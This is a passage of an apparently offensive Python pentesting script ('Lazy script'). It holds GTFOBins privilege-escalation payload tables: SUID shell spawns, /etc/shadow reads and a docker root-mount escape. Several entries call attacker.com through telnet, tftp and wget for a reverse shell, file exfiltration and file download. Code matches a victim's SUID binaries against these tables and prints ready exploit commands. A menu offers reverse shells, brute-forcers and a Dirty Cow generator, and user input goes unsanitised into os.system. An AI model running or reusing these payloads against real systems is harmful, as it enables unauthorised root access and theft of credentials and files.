	'sysctl': 'LFILE=file_to_read\n./sysctl -n "/../../$LFILE"',
	'systemctl': 'TF=$(mktemp).service\necho \'[Service]\nType=oneshot\nExecStart=/bin/sh -c "id > /tmp/output"\n[Install]\nWantedBy=multi-user.target\' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF',
	'tac': 'LFILE=file_to_read\n./tac -s \'PromiseWontOverWrite\' "$LFILE"',
	'tar': './tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
	'tee': 'LFILE=file_to_write\necho DATA | ./tee -a "$LFILE"',
	'telnet': 'RHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh',
	'tftp': 'RHOST=attacker.com\n./tftp $RHOST\nput file_to_send',
	'uudecode': 'LFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode',
	'uuencode': 'LFILE=file_to_read\nuuencode "$LFILE" /dev/stdout | uudecode',
	'xz': 'LFILE=file_to_read\n./xz -c "$LFILE" | xz -d',
	'zip': "TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF", 'wget': 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\n./wget $URL -O $LFILE',
	'zsoelim': 'LFILE=file_to_read\n./zsoelim "$LFILE"',
}

"""
The following list contains all default SUID bins found within Unix
"""

defSUIDBinaries = ["arping", "at", "bwrap", "chfn", "chrome-sandbox", "chsh", "dbus-daemon-launch-helper", "dmcrypt-get-device", "exim4", "fusermount", "gpasswd", "helper", "kismet_capture", "lxc-user-nic", "mount", "mount.cifs", "mount.ecryptfs_private", "mount.nfs", "newgidmap", "newgrp", "newuidmap", "ntfs-3g", "passwd", "ping", "ping6", "pkexec", "polkit-agent-helper-1", "pppd", "snap-confine", "ssh-keysign", "su", "sudo", "traceroute6.iputils", "ubuntu-core-launcher", "umount", "VBoxHeadless", "VBoxNetAdpCtl", "VBoxNetDHCP", "VBoxNetNAT", "VBoxSDL", "VBoxVolInfo", "VirtualBoxVM", "vmware-authd", "vmware-user-suid-wrapper", "vmware-vmx", "vmware-vmx-debug", "vmware-vmx-stats", "Xorg.wrap"]

"""
Auto Exploitation of SUID Bins - List
"""

suidExploitation = {
	'ash': '',
	'bash': '-p',
	'busybox': 'sh',
	'cat': '/etc/shadow',
	'chroot': '/ /bin/sh -p',
	'csh': '-b',
	'cut': '-d "" -f1 /etc/shadow',
	'dash': '-p',
	'docker': 'run -v /:/mnt --rm -it alpine chroot /mnt sh',
	'emacs': '-Q -nw --eval \'(term "/bin/sh -p")\'',
	'env': '/bin/sh -p',
	'expand': '/etc/shadow',
	'expect': '-c "spawn /bin/sh -p;interact"',
	'find': '. -exec /bin/sh -p \\; -quit',
	'flock': '-u / /bin/sh -p',
	'fold': '-w99999999 /etc/shadow',
	'gawk': '\'BEGIN {system("/bin/sh")}\'',
	'gdb': '-q -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
	'gimp': '-idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'',
	'grep': '"" /etc/shadow',
	'head': '-c2G /etc/shadow',
	'ionice': '/bin/sh -p',
	'jrunscript': '-e "exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\')"',
	'ksh': '-p',
	'ld.so': '/bin/sh -p',
	'less': '/etc/shadow',
	'logsave': '/dev/null /bin/sh -i -p',
	'lua': '-e \'os.execute("/bin/sh")\'',
	'make': '-s --eval=$\'x:\\n\\t-\'"/bin/sh -p"',
	'mawk': '\'BEGIN {system("/bin/sh")}\'',
	'more': '/etc/shadow',
	'nice': '/bin/sh -p',
	'nl': '-bn -w1 -s \'\' /etc/shadow',
	'node': 'node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});\'',
	'od': 'od -An -c -w9999 /etc/shadow | sed -E -e \'s/ //g\' -e \'s/\\\\n/\\n/g\'',
	'perl': '-e \'exec "/bin/sh";\'',
	'pg': '/etc/shadow',
	'php': '-r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
	'python': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
	'rlwrap': '-H /dev/null /bin/sh -p',
	'rpm': '--eval \'%{lua:os.execute("/bin/sh", "-p")}\'',
	'rpmquery': '--eval \'%{lua:posix.exec("/bin/sh", "-p")}\'',
	'rsync': '-e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
	'run-parts': '--new-session --regex \'^sh$\' /bin --arg=\'-p\'',
	'rvim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
	'sed': '-e "" /etc/shadow',
	'setarch': '$(arch) /bin/sh -p',
	'sort': '-m /etc/shadow',
	'start-stop-daemon': '-n $RANDOM -S -x /bin/sh -- -p',
	'stdbuf': '-i0 /bin/sh -p',
	'strace': '-o /dev/null /bin/sh -p',
	'tail': '-c2G /etc/shadow',
	'taskset': '1 /bin/sh -p',
	'time': '/bin/sh -p',
	'timeout': '7d /bin/sh -p',
	'ul': '/etc/shadow',
	'unexpand': 'unexpand -t99999999 /etc/shadow',
	'uniq': '/etc/shadow',
	'unshare': '-r /bin/sh',
	'vim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
	'watch': '-x sh -c \'reset; exec sh 1>&0 2>&0\'',
	'xargs': '-a /dev/null sh -p',
	'xxd': '/etc/shadow | xxd -r',
	'zsh': '',
}

"""
The following list contains GTFO Bins binaries which are SUID exploitable
"""

gtfoBinsList	= ['bash', 'busybox', 'cat', 'chroot', 'cut', 'dash', 'docker', 'env', 'expand', 'expect', 'find', 'flock', 'fold', 'gdb', 'grep', 'head', 'ionice', 'jrunscript', 'ksh', 'ld.so', 'less', 'logsave', 'make', 'more', 'nice', 'nl', 'node', 'od', 'perl', 'pg', 'php', 'python', 'rlwrap', 'rpm', 'rpmquery', 'rsync', 'run-parts', 'rvim', 'sed', 'setarch', 'sort', 'start-stop-daemon', 'stdbuf', 'strace', 'tail', 'taskset', 'time', 'timeout', 'ul', 'unexpand', 'uniq', 'unshare', 'vim', 'watch', 'xargs', 'xxd', 'zsh', 'aria2c', 'arp', 'ash', 'base32', 'base64', 'byebug', 'chmod', 'chown', 'cp', 'csh', 'curl', 'date', 'dd', 'dialog', 'diff', 'dmsetup', 'file', 'ed', 'emacs', 'eqn', 'fmt', 'gawk', 'gimp', 'git', 'gtester', 'hd', 'hexdump', 'highlight', 'iconv', 'iftop', 'ip', 'jjs', 'jq', 'ksshell', 'ldconfig', 'look', 'lua', 'lwp-download', 'lwp-request', 'mawk', 'mv', 'mysql', 'awk', 'nano', 'nawk', 'nc', 'nmap', 'nohup', 'openssl', 'pic', 'pico', 'pry', 'readelf', 'restic', 'scp', 'shuf', 'soelim', 'sqlite3', 'socat', 'strings', 'sysctl', 'systemctl', 'tac', 'tar', 'tclsh', 'tee', 'telnet', 'tftp', 'uudecode', 'uuencode', 'xz', 'zip', 'wget', 'zsoelim']

"""
Colors List
"""

cyan 	= "\033[0;96m"
green 	= "\033[0;92m"
white 	= "\033[0;97m"
red 	= "\033[0;91m"
blue 	= "\033[0;94m"
yellow 	= "\033[0;33m"
magenta = "\033[0;35m"

barLine = "------------------------------"

#All Suid exploits 

def doSomethingPlis(listOfSuidBins):
    '''
    This function prints the following data:
            -Default binaries which ship with installation of linux
            -Custom binaries which aren't part of default list
            -Binaries which match GTFObins List!
    '''

    _bins = []
    binsInGTFO = []
    customSuidBins = []
    defaultSuidBins = []

    for bins in listOfSuidBins:
        _binName = bins.split("/")[::-1][0]

        if _binName not in defSUIDBinaries:
            customSuidBins.append(bins)

            if _binName in gtfoBinsList:
                binsInGTFO.append(bins)

        else:
            defaultSuidBins.append(bins)



    print(white + "["+ red + "!" + white + "] Default Binaries (Don't bother)")
    print(barLine)
    for bins in defaultSuidBins: print(blue + bins)
    print(white + barLine + "\n\n")
    print(white + "[" + cyan + "~" + white + "] " + cyan + "Custom SUID Binaries (Interesting Stuff)")
    print(white + barLine)
    for bins in customSuidBins: print(cyan + bins)
    print(white + barLine + "\n\n")

    if len(binsInGTFO)!=0:
        print("[" + green + "#" + white + "] " + green + "SUID Binaries in GTFO bins list (Hell Yeah!)")
        print(white + barLine)

        for bin in binsInGTFO:
            #pathOfBin 	= popen("which " + bin).read().strip()
            gtfoUrl 	= "https://gtfobins.github.io/gtfobins/" + bin[::-1].split("/")[0][::-1] + "/#suid"
            print(green + bin + white + " -~> " + magenta + gtfoUrl)
        

        print(white + barLine + "\n\n")

    else:
        print("[" + green + "#" + white + "] " + green + "SUID Binaries not found in GTFO bins..")
        print(white + barLine)
        print("[" + red + "!" + white + "] " + magenta + "None " + red + ":(")
        print(white + barLine + "\n\n")


    binsToExploit = []
    _binsToExploit = {}

    for binary in binsInGTFO:
        binaryName = binary[::-1].split("/")[0][::-1]
        if binaryName not in suidExploitation:
            _binsToExploit[binary] = customSUIDs[binaryName]

    if len(_binsToExploit) != 0:
        print("[" + yellow + "&" + white + "] " + cyan + "Manual Exploitation (Binaries which create files on the system)")
        print(white + barLine)
        for binaryPath, binaryExploitation in _binsToExploit.items():
            binaryName 			= binaryPath[::-1].split("/")[0][::-1]
            binaryExploitation 	= binaryExploitation.replace(binaryName, binaryPath).replace("./", "")
            print(white + "[" + cyan + "&" + white + "] " + magenta + binaryName.capitalize() + white + " ( " + green + binaryPath + " )" + white)
            print(yellow + binaryExploitation + white + "\n")
        print(white + barLine + '\n\n')

    return(binsInGTFO, defaultSuidBins, customSuidBins)




def exploit(bins):
	commands 	= []

	for suidBins in bins:
		_bin 	= suidBins.split("/")[::-1][0]

		if _bin in suidExploitation:
			_results 	= suidBins + " " + suidExploitation[_bin]
			commands.append(_results)

	if len(commands) != 0:
            #jack
	
	    print(white + "[" + green + "$" + white + "] " + white + "Please try the command(s) below to exploit harmless SUID bin(s) found !!!")
	    print(white + barLine)

	    for _commands in commands:

                #jacl
		    print("[~] " + _commands)

	    print(white + barLine + "\n\n")


def Gtf():
    clear()
    colored_print("[*]Starting SUID exploit")
    colored_print("[*]Run the command in the victim machine:find / -perm -4000 -type f 2>/dev/null")
    colored_print("[*]Copy all the things in attacker machine in a file")
    king = str(input("[*]Enter the full path of the file: "))

    
    
    results = [] # list to store the bins
    
    with open(king,'r') as f:
        for lines in f.readlines():
            bins = lines.strip("\n")
            results.append(bins)

    f.close()

    gtfoBins = doSomethingPlis(results)
    exploit(gtfoBins[0])

    print(colored("Waiting for 3 minutes"))
    time.sleep(180)


#directory
def dirbuster():
	clear();
	colored_print("[*]Starting dirbuster")
	#ffuf -u http://10.10.67.80:8080/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .html,.py,.txt,.php
	url = str(input("[*]Enter url: "))

	if not url.endswith('/'):
		url = url + "/"
	file = str(input("[*]Enter file name to log[Extension has to be .json]: "))
	t = get_wordlist() # to get the wordlist

	os.system("ffuf -u " + url + "FUZZ -w " + t+ " -e .html,.txt,.php,.zip,.js,.jpg -o " + enum_dir + file)
	os.system("cat " + enum_dir + file + "| python -mjson.tool | tee " + enum_dir+file)
	status(enum_dir,file)


#Banner
def banner():
    print("\n")
    print("\n")

    print(colored('                       ██╗      █████╗ ███████╗██╗   ██╗      ','blue',attrs=["bold"]))
    print(colored('                       ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝      ','blue',attrs=["bold"]))
    print(colored('                       ██║     ███████║  ███╔╝  ╚████╔╝       ','blue',attrs=["bold"]))
    print(colored('                       ██║     ██╔══██║ ███╔╝    ╚██╔╝        ','blue',attrs=["bold"]))
    print(colored('                  The  ███████╗██║  ██║███████╗   ██║  script ','blue',attrs=["bold"]))
    print(colored('                       ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝         ','blue',attrs=["bold"]))


#Menu
def menu():
    banner()
    colored_print("|--------------------------------------------------------------------------------------------------|")
    colored_print("|                             Press 0 to add to host                                               |")
    colored_print("|    1>Intense Nmap Scan                |          2>Nmap scan for UDP connection                  |")
    colored_print("|    3>Http service enum                |          4>FFuf for directory enum                       |")
    colored_print("|    5>Wordlist generator from page     |          6>Generate Meterpreter Rev shell                |")
    colored_print("|    7>Enum4linux                       |          8>WordPress Scan                                |")
    colored_print("|    9>WordPress Password Brute         |          10>Nikto Scan                                   |")
    colored_print("|    11>Https service scanner           |          12>CMS Detector                                 |")
    colored_print("|    13>Encrypted SSH Key crack         |          14>SSH Bruteforce                               |")
    colored_print("|    15>FTP Bruteforce                  |          16>Bruteforce ZIP File                          |")
    colored_print("|    17>PHP-REV Shell                   |          18>Mssql service scanner                        |")
    colored_print("|    19>GTFObins                        |          20>Windows Exploit Suggester                    |")
    colored_print("|    21>Linux Exploit Suggester(Local)  |          22>Dirty Cow Exploit Generator                  |")
    colored_print("|    23>Base64 Decode                   |          24>Stegcracker                                  |")
    colored_print("|    25>Decode ROT                      |          26>Exiftool                                     |")
    #colored_print("|	27>dns recon   					             				      							  |")
    colored_print("|--------------------------------------------------------------------------------------------------|")
    command()
#Taking the command from user
def command():
    colored_print("[*]If somethign Wrong Happen Then Restart The script")
    option = int(input("[*]Enter your option: "))
    if option == 0:
        edit_host()
    if option == 1:
        intense_scan()
    if option == 2:
        udp_scan()
    if option == 3:
        http_enum()
    if option == 4:
        dirbuster()
    if option == 5:
        Cewl()
    if option == 6:
        meterpreter()
    if option == 7:
        enum()
    if option == 8:

        wordpress_scan()
    if option == 9:
        wordpress_brute()
    if option == 10:
        nikto()
    if option == 11:
        https_enum()
    if option == 12:
        cms_cheker()
    if option == 13:
        key_crack()
    if option == 14:
        crack_ssh()
    if option == 15:
        crack_ftp()
    if option == 16:
        brute_zip()
    if option == 17:
        rev_shell()
    if option == 18:
        mssqlEnum()
    if option == 19:
        Gtf()
    if option == 20:
        windows()
    if option == 21:
        local_linux()
    if option == 22:
        dirty_cow()
    if option == 23:
        decode_base()
    if option == 24:
        stegcrack()
    if option == 25:
        decode_rot()
    if option == 26:
        exif()
    # if option == 27:
    # 	dns_recon()
def main():
    clear()
    #basic_recon()
    choice = str(input("[*]Do you want to start basic recon[y/n]: "))
    if choice == 'y':
        basic_scan()
    while True:
        clear()
        menu()
        time.sleep(10)


if __name__ == "__main__":
    main()

